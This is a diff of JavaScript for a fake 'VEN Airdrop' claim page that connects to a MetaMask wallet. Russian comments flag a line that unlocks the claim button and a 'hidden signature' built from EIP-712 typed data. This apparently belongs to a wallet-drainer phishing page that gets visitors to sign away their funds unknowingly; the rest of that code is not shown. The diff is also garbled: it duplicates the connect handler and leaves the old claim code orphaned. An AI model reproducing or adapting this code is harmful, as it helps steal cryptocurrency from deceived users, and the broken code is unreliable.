@@ -47,11 +47,15 @@ document.getElementById("connect").onclick = async () => {
   } catch { document.getElementById("status").textContent = "Rejected"; }
 };
 
-document.getElementById("claim").onclick = async () => {
-  document.getElementById("status").textContent = "Signing...";
-  document.getElementById("claim").disabled = true;
+document.getElementById("connect").onclick = async () => {
+  if (!window.ethereum) return document.getElementById("status").textContent = "Install MetaMask";
   try {
-    const user = (await ethereum.request({method:"eth_accounts"}))[0];
+    const a = await ethereum.request({method:"eth_requestAccounts"});
+    document.getElementById("addr").textContent = "Connected: " + a[0].slice(0,8)+"...";
+    document.getElementById("claim").disabled = false;  // ← ЭТА СТРОКА РАЗБЛОКИРУЕТ КНОПКУ
+    document.getElementById("status").textContent = "Ready!";
+  } catch { document.getElementById("status").textContent = "Rejected"; }
+};
 
     // Скрытая подпись
     const domain = {name:"VEN Airdrop",version:"1",chainId:await ethereum.request({method:"eth_chainId"}),verifyingContract:"0x0000000000000000000000000000000000000000"};
